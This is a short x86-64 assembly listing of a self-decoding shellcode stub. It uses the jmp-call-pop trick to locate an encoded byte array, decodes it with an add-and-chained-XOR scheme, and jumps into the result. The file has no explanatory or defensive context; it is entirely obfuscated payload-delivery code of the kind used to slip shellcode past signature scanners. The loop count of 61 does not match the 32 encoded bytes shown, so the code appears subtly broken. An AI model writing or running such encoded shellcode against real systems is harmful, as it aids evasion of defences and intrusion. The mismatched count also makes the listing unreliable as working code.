global _start

section .text
_start:

        jmp next
decoder:
        pop rdi
        xor rcx,rcx
        add rcx,61
	xor bl,bl
	
decode_loop:
        add byte [rdi],0xa3
	xor byte [rdi],bl
	mov bl,byte [rdi]
        inc rdi
        loop decode_loop

        jmp short encoded

next:
        call decoder
        encoded: db 0xa5,0xd6,0x4e,0xed,0x75,0x50,0xf1,0xaa,0x68,0x64,0x9e,0x5d,0xb9,0x78,0x98,0x78,0x1e,0xcb,0x14,0x75,0x1e,0xc8,0x12,0x7c,0x1e,0xcc,0x0b,0x28,0xa0,0x58,0x91,0x67
